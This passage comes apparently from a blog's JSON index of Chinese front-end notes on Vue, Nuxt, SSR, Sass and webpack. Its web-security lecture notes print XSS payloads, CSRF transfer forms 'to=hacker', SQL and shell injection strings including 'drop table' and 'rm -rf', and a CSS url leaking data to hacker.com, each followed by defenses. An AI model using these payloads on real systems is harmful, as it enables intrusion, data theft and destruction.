向下传递，事件向上传递的。遵循这一约定会让你的组件更易于理解。然而，在一些边界情况下 prop 的变更或 this.$parent 能够简化两个深度耦合的组件。 问题在于，这种做法在很多简单的场景下可能会更方便。但请当心，不要为了一时方便 (少写代码) 而牺牲数据流向的简洁性 (易于理解)。 非 flux 的全局状态管理 应该优先通过 Vuex 管理全局状态，而不是通过 this.$root 或一个全局事件总线。 通过 this.$root 和/或全局事件总线管理状态在很多简单的情况下都是很方便的，但是并不适用于绝大多数的应用。 Vuex 是 Vue 的官方类 flux 实现，其提供的不仅是一个管理状态的中心区域，还是组织、追踪和调试状态变更的好工具。它很好地集成在了 Vue 生态系统之中 (包括完整的 Vue DevTools 支持)。","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"nuxtjs 的生命周期","slug":"work/04 nuxtjs 生命周期","date":"2022-02-21T03:28:00.000Z","updated":"2022-02-21T03:35:00.000Z","comments":false,"path":"workNotes/work/04 nuxtjs 生命周期","link":"workNotes/work/04 nuxtjs 生命周期","permalink":"https://shylees.github.io/workNotes/work/04%20nuxtjs%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F","excerpt":"","text":"asyncData 可能想要在服务器端获取并渲染数据。Nuxt.js添加了asyncData方法使得你能够在渲染组件之前异步获取数据。 asyncData 是最常用最重要的生命周期，同时也是服务端渲染的关键点。 该生命周期只限于页面组件调用，第一个参数为 context。 它调用的时机在组件初始化之前，运作在服务端环境。 所以在 asyncData 生命周期中，我们无法通过 this 引用当前的 Vue 实例，也没有 window 对象和 document 对象，这些是我们需要注意的。 一般在 asyncData 会对主要页面数据进行预先请求，获取到的数据会交由服务端拼接成 html 返回前端渲染，以此提高首屏加载速度和进行 seo 优化。 fecth 用于在渲染页面前填充应用的状态树（store）数据， 与 asyncData 方法类似，不同的是它不会设置组件的数据。 得知该生命周期用于填充 Vuex 状态树，与 asyncData 同样，它在组件初始化前调用，第一个参数为 context。但这并不是说我们只能在 fetch 中填充状态树，在 asyncData 中同样可以。 validate 但这并不是说我们只能在 fetch 中填充状态树，在 asyncData 中同样可以。 在验证路由参数合法性时，它能够帮助我们，第一个参数为 context。与上面有点不同的是，我们能够访问实例上的方法 this.methods.xxx。 watchQuery 监听参数字符串更改并在更改时执行组件方法 (asyncData, fetch, validate, layout, …) watchQuery 可设置 Boolean 或 Array (默认: [])。使用 watchQuery 属性可以监听参数字符串的更改。 如果定义的字符串发生变化，将调用所有组件方法(asyncData, fetch, validate, layout, …)。 为了提高性能，默认情况下禁用。 使用 watchQuery有点好处就是，当我们使用浏览器后退按钮或前进按钮时，页面数据会刷新，因为参数字符串发生了变化。 head Nuxt.js 使用了 vue-meta 更新应用的 头部标签(Head) 和 html 属性。 使用 head 方法设置当前页面的头部标签，该方法里能通过 this 获取组件的数据。 除了好看以外，正确的设置 meta 标签，还能有利于页面被搜索引擎查找，进行 seo 优化。 一般都会设置 description(简介) 和 keyword(关键词)。 生命周期的调用顺序 validate =&gt; asyncData =&gt; fetch =&gt; head 参考链接 https://juejin.cn/post/6844904160324747278#heading-12","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"ssr","slug":"ssr","permalink":"https://shylees.github.io/tags/ssr/"}]},{"title":"ssr - Server Side Render","slug":"work/03 ssr","date":"2022-02-18T10:13:00.000Z","updated":"2022-02-18T11:07:00.000Z","comments":false,"path":"workNotes/work/03 ssr","link":"workNotes/work/03 ssr","permalink":"https://shylees.github.io/workNotes/work/03%20ssr","excerpt":"","text":"参考链接：https://juejin.cn/post/7002198277462442014 服务端渲染 ssr，是指一种传统的渲染开发方式，就是在页面请求url的时候，服务端将我们需要的 html 文本组装好，并返回给浏览器，这个HTML文本被浏览器解析之后，不需要经过 JavaScript 脚本的执行，即可直接构建出希望的 DOM 树并展示到页面中。 ssr 有两种模式，单页面 和 非单页面 模式 单页面：后端首次渲染的单页面应用 非单页面：完全使用后端路由的后端模版渲染模式 区别于 使用后端路由的程度 csr - Client Side Render csr与ssr其对应的，一种目前流行的渲染方式，它依赖的是运行在客户端的JS，用户首次发送请求只能得到小部分的指引性HTML代码。第二次请求将会请求更多包含HTML字符串的JS文件。 需要ssr的原因 SPA应用的首屏打开速度很慢，因为用户首次加载需要先下载SPA框架及应用程序的代码，然后再渲染页面，且 SPA 应用不利于 SEO 优化。 想着是不是可以将应用首页先加载出来，然后让首页用不到的其他 JS 文件再慢慢加载。但是由于 JS 引擎是单线程的，数据的组装过程会受到阻塞，单靠浏览器端的话不容易实现。 SSR 契机就在此，如果将组装数据、渲染 HTML 页面的过程放在服务端，而浏览器端只负责显示接收到的 HTML 文件，那首屏的打开速度无疑会快很多。 优缺点 优点 更快的响应时间，相对于客户端渲染，服务端渲染在浏览器请求URL之后已经得到了一个带有数据的HTML文本，浏览器只需要解析HTML，直接构建DOM树就可以 有利于 SEO ，可以将 SEO 的关键信息直接在后台就渲染成 HTML，而保证搜索引擎的爬虫都能爬取到关键数据，然后在别人使用搜索引擎搜索相关的内容时，你的网页排行能靠得更前，这样你的流量就有越高。 缺点 相对于只需要提供静态文件的服务器，SSR中使用的渲染程序自然会占用更多的CPU和内存资源 一些常用的浏览器API可能无法正常使用，比如window、docment和alert等，如果使用的话需要对运行的环境加以判断 开发调试会有一些麻烦，因为涉及了浏览器及服务器，对于SPA的一些组件的生命周期的管理会变得复杂 可能会由于某些因素导致服务器端渲染的结果与浏览器端的结果不一致 总结 最适用于静态展示页面，如果页面动态数据较多时需要谨慎使用。","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"单页面应用","slug":"work/02 spa优缺点","date":"2022-02-18T09:23:00.000Z","updated":"2022-02-18T09:58:00.000Z","comments":false,"path":"workNotes/work/02 spa优缺点","link":"workNotes/work/02 spa优缺点","permalink":"https://shylees.github.io/workNotes/work/02%20spa%E4%BC%98%E7%BC%BA%E7%82%B9","excerpt":"","text":"参考链接：https://juejin.cn/post/6950100237985775623 单页面应用程序将所有的活动局限于一个Web页面中，在该Web页面初始化时加载相应的HTML、JavaScript 和 CSS。一旦页面加载完成，单页面应用不会因为用户的操作而进行页面的重新加载或跳转。取而代之的是利用 JavaScript 动态的变换HTML的内容，从而实现UI与用户的交互。由于避免了页面的重新加载，单页面应用可以提供较为流畅的用户体验。 1. 优点 良好的交互体验 内容改变不需要重新加载整个页面，获取数据通过 ajax 异步获取，没有页面之间的切换，不会在跳转的时候出现 “白屏现象”，页面显示流畅。 良好的前后端工作分离模式 后端不负责模版渲染、输出页面工作，后端 api 通用化 减轻服务器压力 相对服务器压力小，服务器只用出数据就可以，不用管展示逻辑和页面合成，吞吐能力提高 2. 缺点 首屏加载慢 解决： vue-router 懒加载 vue-router 是按需加载组件，只有当路由被访问时才会加载对应组件，而不是在加载首页时加载，项目越大，对首屏加载的速度提升得越明显 使用 cdn 加速 在做项目时，我们会用到很多库，采用cdn可以加快加载速度 异步加载组件 服务端渲染 也对 seo 优化起到作用，有利于搜索引擎抓取更多信息r 如果页面纯 前端渲染，搜索引擎抓取到的就只是空页面 不利于 seo seo 本质是 一个服务器向另一个服务器发请求，解析请求内容。 但一般来说搜索引擎是不会去执行请求到 js 的，即 搜索引擎的基础爬虫的原理就是抓取 url，然后获取 html 源代码并解析 如果是一个 spa ，html 在浏览器才渲染出数据， seo 请求到的html 是模型页面 而不是 最终数据的 渲染页面，这样就不利于内容被搜索引擎搜到 解决： 服务端渲染 ssr 服务器合成完整的 html 文件再输出到浏览器 页面预渲染 路由采用 h5 history模式 不适合开发大型项目 有可能涉及大量 dom 操作、复杂动画效果","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]},{"title":"sass -- css 预处理器","slug":"work/01 scss sass","date":"2022-02-18T06:58:00.000Z","updated":"2022-02-18T08:39:00.000Z","comments":false,"path":"workNotes/work/01 scss sass","link":"workNotes/work/01 scss sass","permalink":"https://shylees.github.io/workNotes/work/01%20scss%20sass","excerpt":"","text":"2022.02.18 在公司熟悉环境时看到用的 cass 所以先去了解 参考网站 https://www.sass.hk/guide/ 介绍：https://juejin.cn/post/6844904169313140749 简洁区别：https://juejin.cn/post/6844904086676963341 sass css 预处理器 CSS 预处理器定义了一种新的语言，其基本思想是，用一种专门的编程语言，为 CSS 增加了一些编程的特性，将 CSS 作为目标生成文件，然后开发者就只要使用这种语言进行CSS的编码工作。 0.1 使用 预处理器的原因 CSS仅仅是一个标记语言，不可以自定义变量，不可以引用。 CSS有具体以下几个缺点： 语法不够强大，比如无法嵌套书写，导致模块化开发中需要书写很多重复的选择器； 没有变量和合理的样式复用机制，使得逻辑上相关的属性值必须以字面量的形式重复输出，导致难以维护。 预编译很容易造成后代选择器的滥用 使用预处理器的优点: 提供CSS层缺失的样式层复用机制 减少冗余代码 提高样式代码的可维护性 Sass 和 Less 这类语言，其实可以理解成 CSS 的超集，它们在CSS 原本的语法格式基础上，增加了编程语言的特性，如变量的使用、逻辑语句的支持、函数等。让 CSS 代码更容易维护和复用。 但浏览器最终肯定是只认识 CSS 文件的，它无法处理 CSS 中的那些变量、逻辑语句，所以需要有一个编译的过程，将 Sass 或 Less 写的代码转换成标准的 CSS 代码，这个过程就称为 CSS 预处理。 0.2 less &amp; sass Less （Leaner Style Sheets 的缩写） 是一门向后兼容的 CSS 扩展语言。因为 Less 和 CSS 非常像，Less 仅对 CSS 语言增加了少许方便的扩展，学习很容易 . sass，作为”世界上最成熟、最稳定、最强大的专业级CSS扩展语言”。兼容所有版本的css，且有无数框架使用sass构建，如Compass，Bourbon，和Susy。 SASS版本3.0之前的后缀名为.sass，而版本3.0之后的后缀名.scss。 相同之处： 1、混入(Mixins)—class中的class； 2、参数混入—可以传递参数的class，就像函数一样； 3、嵌套规则—Class中嵌套class，从而减少重复的代码； 4、运算—CSS中用上数学； 5、颜色功能—可以编辑颜色； 6、名字空间(namespace)—分组样式，从而可以被调用； 7、作用域—局部修改样式； 8、JavaScript 赋值—在CSS中使用JavaScript表达式赋值。 不同之处： sass less 环境: dart或其他 | 基于javascript,可以运行在 Node 或浏览器 使用: 复杂 | 简单(相对而言) 功能: 复杂 | 简单(相对而言) 处理机制: 服务端处理 | 可以运行在 Node 或浏览器端 变量: 以 $ 开头 | 以 @ 开头 文件后缀: .sass 或. scss | .less 在Less中，仅允许循环数值。 在Sass中，我们可以遍历任何类型的数据。但在Less中，我们只能使用递归函数循环数值。 条件语句 Less 中并不支持条件语句，当然，可以通过内置函数 if 以及 and，or，not 这些来模拟条件语句。 在 Sass 中是支持条件语句的，但也不是像其他编程语言直接 if 这样通过保留字来编写，需要加个 @ 符号 1. 使用变量 sass 使用 $ 作为标识变量 老版的 scss 使用 ! 作为标识，改变的原因 – 太丑了 ? 声明 引用 123456789101112131415161718 $highlight-color: #F90; .selected &#123; border: $highlight-border; &#125;2. 变量名用中划线 / 下划线 随便、爱用啥用啥，且 sass 将其视为一样的，都指向一个变量## 2. 嵌套 css 规则~~~css #content &#123; article &#123; h1 &#123; color: #333 &#125; p &#123; margin-bottom: 1.4em &#125; &#125; aside &#123; background-color: #EEE &#125;&#125; 1.1 父选择器标识符 &amp; 1234567article a &#123; color: blue; &amp;:hover &#123; color: red &#125;&#125;/*编译后*/article a &#123; color: blue &#125;article a:hover &#123; color: red &#125; 1.2 群组选择器 , 123.container &#123; h1, h2, h3 &#123;margin-bottom: .8em&#125;&#125; 1.3 子组合选择器和同层组合选择器 &gt; + ~ 12345678/* 子 */article &gt; section &#123; border: 1px solid #ccc &#125;/* 同层相邻组合 */header + p &#123; font-size: 1.1em &#125;/* 同层全体组合 */article ~ article &#123; border-top: 1px dashed #ccc &#125; 1.4 嵌套属性 1234567891011121314nav &#123; border: &#123; style: solid; width: 1px; color: #ccc; &#125;&#125;nav &#123; border: 1px solid #ccc &#123; left: 0px; right: 0px; &#125;&#125; 3. 导入 sass 文件 css 中不常用的特性：@import 规则，它允许在一个css 文件中导入其他 css 文件。然而，后果是只有执行到 @import 时，浏览器才会去下载其他 css 文件，这导致页面加载起来特别慢。 sass也有一个@import规则，但不同的是，sass的@import规则在生成css文件时就把相关文件导入进来。这意味着所有相关的样式被归纳到了同一个css文件中，而无需发起额外的下载请求。 3.1 局部文件 / 部分文件 当通过@import把sass样式分散到多个文件时，你通常只想生成少数几个css文件。那些专门为@import命令而编写的sass文件，并不需要生成对应的独立css文件，这样的sass文件称为局部文件。 此约定即，sass局部文件的文件名以下划线开头。这样，sass就不会在编译时单独编译这个文件输出css，而只把这个文件用作导入。当你@import一个局部文件时，还可以不写文件的全名，即省略文件名开头的下划线。 3.2 默认变量值 !default 1234$fancybox-width: 400px !default;.fancybox &#123; width: $fancybox-width;&#125; 如果用户在导入你的sass局部文件之前声明了一个$fancybox-width变量，那么你的局部文件中对$fancybox-width赋值400px的操作就无效。如果用户没有做这样的声明，则$fancybox-width将默认为400px。 3.3 嵌套导入 跟原生的css不同，sass允许@import命令写在css规则内。这种导入方式下，生成对应的css文件时，局部文件会被直接插入到css规则内导入它的地方 123456789101112131415/* blue-theme 文件 */aside &#123; background: blue; color: white;&#125;/* 使用文件 */.blue-theme &#123;@import &quot;blue-theme&quot;&#125;.blue-theme &#123; aside &#123; background: blue; color: #fff; &#125;&#125; 3.4 原生 css 导入 由于sass兼容原生的css，所以它也支持原生的CSS @import。 尽管通常在sass中使用@import时，sass会尝试找到对应的sass文件并导入进来，但在下列三种情况下会生成原生的CSS@import，这会造成浏览器解析css时的额外下载： 被导入文件的名字以.css结尾； 被导入文件的名字是一个URL地址（比如http://www.sass.hk/css/css.css），由此可用谷歌字体API提供的相应服务； 被导入文件的名字是CSS的url()值。 so 不能用sass的@import直接导入一个原始的css文件，因为sass会认为你想用css原生的@import。 但是，因为sass的语法完全兼容css，所以你可以把原始的css文件改名为.scss后缀，即可直接导入了 4. 静默注释 sass 提供了一种不同于 css 标准的注释格式 // , 在编译成 css 后，这些用 // 的注释语句都会被抹去 5. 混合器 @mixin @include 需要大段大段的重用样式的代码，可以通过sass的混合器实现大段样式的重用。 混合器使用@mixin标识符定义。这个标识符给一大段样式赋予一个名字，可以通过引用这个名字重用这段样式 1234567891011121314151617@mixin rounded-corners &#123; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px;&#125;notice &#123; background-color: green; border: 2px solid #00aa00; @include rounded-corners;&#125;/* less */.post a &#123; color: red; rounded-corners();&#125; 5.1 使用混合器的时间 混合器是在样式表中应用的。混合器是展示性的描述，用来描述一条css规则应用之后会产生怎样的效果。 混合器和类配合使用写出整洁的html和css，因为使用语义化的类名亦可以帮你避免重复使用混合器。 5.2 混合器中css规则 不仅可以包含属性，也可以包含css规则，包含选择器和选择器中的属性 12345678@mixin no-bullets &#123; list-style: none; li &#123; list-style-image: none; list-style-type: none; margin-left: 0px; &#125;&#125; 5.3 给混合器传参 可以通过在@include混合器时给混合器传参，来定制混合器生成的精确样式 123456789101112131415161718@mixin link-colors($normal, $hover, $visited) &#123; color: $normal; &amp;:hover &#123; color: $hover; &#125; &amp;:visited &#123; color: $visited; &#125;&#125;a &#123; @include link-colors(blue, red, green);&#125;/* 通过$name: value的形式指定每个参数的值 */a &#123; @include link-colors( $normal: blue, $visited: green, $hover: red );&#125; 5.4 默认参数值 参数默认值使用$name: default-value的声明形式，默认值可以是任何有效的css属性值，甚至是其他参数的引用 12345678910@mixin link-colors( $normal, $hover: $normal, $visited: $normal )&#123; color: $normal; &amp;:hover &#123; color: $hover; &#125; &amp;:visited &#123; color: $visited; &#125;&#125; 6. 使用选择器继承 @extend if 想重用语义化 12345678.error &#123; border: 1px solid red; background-color: #fdd;&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; .seriousError将会继承样式表中任何位置处为.error定义的所有样式 == 以class=&quot;seriousError&quot; 修饰的html元素最终的展示效果就好像是class=&quot;seriousError error&quot;。 6.1 什么时候使用继承 混合器主要用于展示性样式的重用，而类名用于语义化样式的重用。因为继承是基于类的（有时是基于其他类型的选择器），所以继承应该是建立在语义化的关系上。 6.2 继承的高级用法 最常用的一种高级用法是继承一个html元素的样式。尽管默认的浏览器样式不会被继承，因为它们不属于样式表中的样式，但是你对html元素添加的所有样式都会被继承 12345678.disabled &#123; color: gray; @extend a;&#125;.disabled &#123; color: gray; @extend a;&#125; if 一条样式规则继承了一个复杂的选择器，那么它只会继承这个复杂选择器命中的元素所应用的样式 6.3 继承的工作细节 @extend背后最基本的想法是: 如果.seriousError @extend .error， 那么样式表中的任何一处.error都用.error.seriousError这一选择器组进行替换。这就意味着相关样式会如预期那样应用到.error和.seriousError 跟混合器相比，继承生成的css代码相对更少。 因为继承仅仅是重复选择器，而不会重复属性，所以使用继承往往比混合器生成的css体积更小。如果你非常关心你站点的速度，请牢记这一点。 继承遵从css层叠的规则。当两个不同的css规则应用到同一个html元素上时，并且这两个不同的css规则对同一属性的修饰存在不同的值，根据权重选择。 混合器本身不会引起css层叠的问题，因为混合器把样式直接放到了css规则中，而继承存在样式层叠的问题。被继承的样式会保持原有定义位置和选择器权重不变。","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"css","slug":"css","permalink":"https://shylees.github.io/tags/css/"}]},{"title":"WEB 开发的安全之旅 - 字节青训营","slug":"ByteDance/10 刘宇晨 web 开发的安全之旅","date":"2022-01-26T16:00:00.000Z","updated":"2022-01-26T16:00:00.000Z","comments":false,"path":"learningNotes/ByteDance/10 刘宇晨 web 开发的安全之旅","link":"learningNotes/ByteDance/10 刘宇晨 web 开发的安全之旅","permalink":"https://shylees.github.io/learningNotes/ByteDance/10%20%E5%88%98%E5%AE%87%E6%99%A8%20web%20%E5%BC%80%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85","excerpt":"","text":"两个角度看安全：hacker 攻击、开发者 防御 攻击者 XSS — Cross-Site Scripting 攻击者在网站上提交一段恶意脚本 &lt;script&gt;&lt;/script&gt; ，网站将其当成自身dom执行编译。 主要利用了： 盲目信任用户提交内容 把用户提交的string 直接转化为 DOM document.write element.innerHTML = anyString; SSR(user_data) 特点： 难以从 UI 上感知，暗地执行脚本 窃取用户信息 cookie/token 绘制 UI 例如弹窗，诱骗用户点击 / 填写表单 存储型 Stored XSS： 恶意脚本被存放在数据库中 访问页面 -&gt; 读数据 == 被攻击 危害最大，对全部用户都可见 反射型 Reflected： 不涉及数据库 从 URL 上攻击 1234567// 例如 url 为 // host/path/?param=&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;public async render(ctx)&#123; const &#123; param &#125; = ctx.query; ctx.status = 200; ctx.body = `&lt;div&gt;$&#123; param &#125;&lt;/div&gt;`&#125; 基于 dom DOM-based： 不需要服务器的参与 恶意攻击的发起 + 执行，全在浏览器完成 123456// 例如 url 为 // host/path/?param=&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;const content = new URL(location.href).searchParams.get(&quot;param&quot;);const div = document.createElement(&#x27;div&#x27;);div.innerHTML = content;document.body.append(div) 与反射型很像，区别在于 完成注入脚本的地方：反射型在 server端、DOM 在浏览器完成闭环 基于 mutation Mutation-based： 利用了浏览器渲染 DOM 的特性 – 独特优化 不同浏览器，会有区别 – 按浏览器进行攻击 1234567&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert()&gt;&quot;&gt;// 为&lt;div&gt; &lt;noscript&gt; &lt;p title=&quot; &lt;/noscript&gt; &lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt; &quot;&quot;&quot;&gt;&quot;&lt;/div&gt; CSRF 跨站伪造请求 — Cross-site request forgery 在用户不知情的前提下，利用用户权限 cookie，构造指定 HTTP 请求，窃取或修改用户铭感信息 例子：银行转账 GET 123&lt;a href=&quot;https://bank.com/transfer?to=hacker&amp;amount=100&quot;&gt;点我抽奖&lt;/a&gt; &lt;img style=&quot;display:none;&quot; src=&quot;https://bank.com/transfer?to=hacker&amp;amount=100&quot; /&gt; POST 1234&lt;form action=&quot;https://bank.com/transfer_tons_of_money&quot; method=&quot;POST&quot;&gt; &lt;input name=&quot;amount&quot; value=&quot;10000&quot; type=&quot;hidden&quot;/&gt; &lt;input name=&quot;to&quot; value=&quot;hacker&quot; type=&quot;hidden&quot;/&gt;&lt;/from&gt; Injection 注入 SQL 请求：SQL 参数 恶意注入 Server：运行 SQL code 获取其他数据、修改数据、删除数据… 1234567891011121314151617181920212223// 读取请求字段 直接以字符串的形式拼接 SQL 语句public async renderForm(ctx)&#123; const &#123; username, form_id &#125; = ctx.query; const result = await aql.query(` select a,b,c from table where username = $&#123;username&#125; and form_id = $&#123; from_id &#125; `); ctx.body = renderForm(result);&#125;// 攻击者fetch(&quot;/api&quot;,&#123; method:&quot;POST&quot;, headers:&#123; &quot;Content-Type&quot;:&quot;application/json&quot; &#125;, body:JSON.stringify(&#123; username: &quot;any; drop table tabelname;&quot; &#125;)&#125;)// 造成 select xxx from xxx drop table tablename 删库跑路 Injection 不止于 SQL CLI 命令行 OS command 系统命令 123456789101112131415161718// 视频格式转换public async convertVideo(ctx)&#123; const &#123; video, options &#125; = ctx.request.body; exec(`convert-cli $&#123; video &#125; -o $&#123; options &#125;`); ctx.body = &quot;ok&quot;;&#125; // 攻击fetch(&quot;/api&quot;, &#123; method: &quot;POST&quot;, body: JSON.stringify(&#123; options:`&#x27; &amp;&amp; rm -rf xxx` &#125;)&#125;);// 生成 删除系统文件的命令 const command = `convert-cli video -o &amp;&amp; rm -rf xxx` 除了删除还能进行 读取 修改 Server-Side Request Forgery — ssrf，服务端伪造请求 严格上说不是 injection ，但是原理类似 123456789// 请求 用户自定义 的callback url// web server 通常有内网访问权限public async webhook(ctx)&#123; // callback 可能是内网 url // e.g http://secret.com/get_employ_payrolls ctx.body = await fetch(ctx.query.callback);&#125;// 访问 callback === 暴露内网信息 Dos — Denial of Service 通过某种方式 构造特定请求，导致服务器资源被显著消耗，来不及响应更多请求，导致请求挤压，进而雪崩效应 ReDos：基于正则表达式的 Dos 贪婪：n 次不行？n-1次再试试 — 回溯 正则表达式的贪婪模式： 重复匹配时 ? 与 no ? 满足一个即可 与 尽量多 12345const greedyRegExp = &quot;/a+/&quot;; // 有多少匹配多少const nonGreedyRegExp = &quot;/a+?/&quot; // 有一个就可以const str = &quot;aaaaa&quot;;console.log(str.match(greedyRegExp)[0]) //aaaaaconsole.log(str.match(nonGreedyRegExp)[0]) //a Logical Dos 耗时的同步操作 数据库写入 SQL join 文件备份 循环执行逻辑 DDos — Distributed Dos 短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积，进而雪崩效应，无法响应新请求。 特点：直接访问 IP、任意 API、消耗大量带宽 demo：SYN Flood 洪水攻击：攻击者发送很多 SYN 与服务器进行连接，但是不进行确认连接， ​ 导致，握手没有完成， connection 不能被释放，达到最大可连接数，无法连接新请求 传输层 — 中间人攻击 原因： 明文传输 信息篡改不可知 对方身份未验证 防御篇 XSS 永远不信任用户的提交内容 不要将用户提交内容直接转换成 DOM 现成工具： 前端：主流框架默认防御 xss、google-closure-library 服务端 node：DOMPurify 用户需求：需要动态生成 DOM，需要注意的点： string 转 DOM：注意转译 new DOMParse() 上传 svg：对其进行扫描，避免生成图片 123&lt;svg&gt; &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/svg&gt; 自定义跳转链接：要过滤，因为可以写js 1&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;&lt;/a&gt; 自定义样式： 123input[type=radio].income-gt10k:checked&#123; background: url(&quot;https://hacker.com/?income=gt10k&quot;)&#125; CSP - Content Security Policy 内容安全策略 哪些源被认为是安全的 来自安全源的脚本可以执行，否则直接抛错 禁止 eval + inline script 设置的方式： 服务器的响应头部： 12Content-Security-Policy: script-src &#x27;self&#x27; // 同源Content-Security-Policy: script-src &#x27;self&#x27; https://domain.com //同源加 后面这个可以访问 浏览器 meta： 1&lt;meta htpp-eqiuv=&quot;Content-Security-Policy&quot; content=&quot;script-src self&quot; /&gt; CSRF 因为其是伪造请求，是异常来源，then 限制请求来源，也就限制了 伪造请求 方法 服务端开发人员可以通过校验 Origin (同源请求中，GET + HEAD 不发送)，Referer（更广泛应用） token： Browser →1. 请求页面 → Server ​ ← 2.页面 + token ← ​ →3. 请求API+token → ​ ← 4.验证 token + 数据← 注意： 要进行用户绑定 要设置过期时间 因为 请求来自合法页面，服务器接收过页面请求，服务器就可以表示 CSRF — iframe 攻击 因为这样就是同源的发送请求了，没办法用 Origin 限制了， 方法 使用 响应头部：X-Frame-Options:deny/sameorigin deny：不能访问 sameorigin：同源可以访问 CSRF anti-pattern GET != GET + POST、明确 get、post 请求各自的功能 如果写成下面的样子，攻击者很容易一石二鸟 12345678// 将更新 获取 逻辑放到同一个 getpublic async getAndUpdate(ctx)&#123; const &#123; update, id &#125; = ctx.query; if(update)&#123; await this.update(update); &#125; ctx.body = await this.get(id);&#125; 避免用户信息被携带：SameSite Cookie 从根源上解决了 csrf，csrf 是利用用户权限及 cookie，去伪造自己是该用户来进行恶意操作，如果攻击者无法获取到 用户的 cookie 那就没用办法进行伪造了。 sameSite 限制了 cookie domain、页面域名； 如果是有 cookie 依赖第三方服务的，可以设置 Set-Cookie: SameSite=None; Secure; SameSite 与 CORS 对比： SameSite：Cookie 发送、domain 与 页面域名 CORS：资源读写 http请求、资源域名 与 页面域名、白名单 正确防御 CSRF — 中间件 Injection SQL 找到项目中查询 SQL 的地方，使用 prepared statement beyond SQL 最小权限原则 不允许访问 sudo || root 建立允许名单 + 过滤 不允许进行 rm 这种系统操作 对 URL 类型参数进行协议、域名、ip等限制 禁止访问内网 DoS Regex DoS 进行 code review，避免出现 贪婪模式的 正则 代码扫描 + 正则性能测试 禁止使用用户提供的正则 Logical Dos 不是非黑即白：有些情况只有再在请求量大到一定之后才会体现 分析代码中的性能瓶颈 限流 DDos 流量治理 负载均衡 – 过滤 api 网关 – 过滤 cdn – 抗量 快速自动扩容 – 抗量 非核心服务降级 – 抗量 传输层 — 防御中间人 使用 https = http + TLS https的特性： 可靠性：加密，非明文传输 完整性：MAC 验证，禁止篡改 — 通过 验证 hash 不可抵赖性：数字签名，进行身份验证 — 密码学 HSTS - HTTP Strict-Transport-Security 将 HTTP 升级到 HTTPS 设置请求头：Strict-Transport-Security：max-age=3600 SRI — Subresource Integrity 防止 CDN 静态资源被篡改：对比 hash Feature / Permission Policy 限制一个页面下，可以使用哪些功能 iframe 也可以通过 allow=“xxx” 设置","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"青训营","slug":"青训营","permalink":"https://shylees.github.io/tags/%E9%9D%92%E8%AE%AD%E8%90%A5/"},{"name":"前端安全","slug":"前端安全","permalink":"https://shylees.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}]},{"title":"构建 webpack 知识体系 - 字节青训营","slug":"ByteDance/12 李文杰 webpack","date":"2022-01-24T16:00:00.000Z","updated":"2022-01-24T16:00:00.000Z","comments":false,"path":"learningNotes/ByteDance/12 李文杰 webpack","link":"learningNotes/ByteDance/12 李文杰 webpack","permalink":"https://shylees.github.io/learningNotes/ByteDance/12%20%E6%9D%8E%E6%96%87%E6%9D%B0%20webpack","excerpt":"","text":"构建 webpack 知识体系 知识体系：https://gitmind.cn/app/doc/fac1c196e29b8f9052239f16cff7d4c7 1. 什么是webpack 本质上是一种前端资源编译、打包工具 多份资源文件打包成一个Bundle 支持 Babel、Eslint、TS、CoffeScript、Less、Sass 支持模块化处理 css、图片等资源文件 支持 HMR + 开发服务器 支持持续监听、持续构建 支持代码分离 支持 Tree-shaking 支持 Sourcemap … 2. 使用 webpack 1. 示例 安装 npm i -D webpack webpack-cli 编辑配置文件 1234567891011121314// webpack.config.jsmodule.exports = &#123; entry:&quot;main.js&quot;, output:&#123; filename:&quot;[name].js&quot;, path:path.join(__dirname,&quot;./dist&quot;), &#125;, module:&#123; rules:[&#123; test:/\\.less$/i, use:[&#x27;style-loader&#x27;,&#x27;css-loader&#x27;,&#x27;less-loader&#x27;] &#125;] &#125;&#125; 执行编译命令 npx webpack 2. 核心流程 — 极简化版 入口处理 ： 从entry文件开始启动编译流程 依赖解析 ：根据require、import等找到依赖资源 资源解析 ：根据module配置，调用资源转移器，将css等非标准js资源转译为 js 内容 资源合并打包 ：将转译后的资源内容合并打包为可直接在浏览器运行的js 3. 配置项概览 使用 webpack 的方法：基本围绕 “配置”展开，可分为 流程类：作用于流程中某个 or 若干个环节，直接影响打包效果的配置项 输入：entry、context 模块解析：resolve、externals 模块转译：module 后处理：optimization、mode、target 工具类：主流程之外，提供更多工程化能力的配置项 开发效率类：watch、devtool、devServer 性能优化类：cache、performance 日志类：stats、infrastructureLogging 其他：amd、bail 配置项的使用频率： entry/output module/plugins mode watch/devServer/devtools 3.1 处理 css – style-loader,css-loader 安装loader 编辑配置项 loader 有什么作用？为什么要用到 css-loader、style-loader？ A: 因为 webpack 只认识 js，为了处理非标准js资源，设计出的资源翻译模块 — loader，将资源翻译为标准 js 与在 html 文件中维护 css 相比，这种方式会有什么优劣？ 如何在webpack接入less、sass、stylus？ 3.2 处理 js – 接入 Babel 安装依赖 npm i -D @babel/core @babel/preset-env babel-loader 声明 output 执行 